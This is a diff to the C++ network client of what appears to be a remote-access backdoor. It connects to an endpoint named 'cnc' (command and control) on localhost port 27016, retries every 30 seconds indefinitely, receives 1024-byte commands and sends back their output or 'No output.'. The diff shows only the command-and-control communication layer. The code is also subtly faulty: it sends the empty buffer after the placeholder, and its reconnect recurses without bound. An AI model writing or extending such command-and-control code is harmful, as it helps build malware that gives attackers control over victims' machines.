@@ -3,26 +3,35 @@
 
 using boost::asio::ip::tcp;
 
-Client::Client()
-{
-	boost::asio::io_context io_context;
-	m_sock = tcp::socket(io_context);
-}
-
 void Client::Connect()
 {
-	tcp::resolver resolver(m_sock.get_executor());
-	boost::asio::connect(m_sock, resolver.resolve("127.0.0.1", "10015"));
+	boost::asio::ip::address addr = boost::asio::ip::address::from_string("127.0.0.1");
+	unsigned short port = 27016;
+	tcp::endpoint cnc(addr, port);
+
+	try
+	{
+		m_sock.connect(cnc);
+	}
+	catch (boost::system::system_error&)
+	{
+		m_sock.close();
+		Sleep(30 * 1000);
+		Connect();
+	}
 }
 
-void Client::Send(std::string msg)
+void Client::Send(std::string&& data)
 {
-	boost::asio::write(m_sock, boost::asio::buffer(msg));
+	if (data.empty())
+		m_sock.send(boost::asio::buffer("No output."));
+	m_sock.send(boost::asio::buffer(data));
 }
 
 std::string Client::Receive()
 {
-	std::string msg;
-	boost::asio::read(m_sock, boost::asio::buffer(msg));
-	return msg;
+	std::string data;
+	data.resize(1024);
+	m_sock.receive(boost::asio::buffer(data));
+	return data;
 }
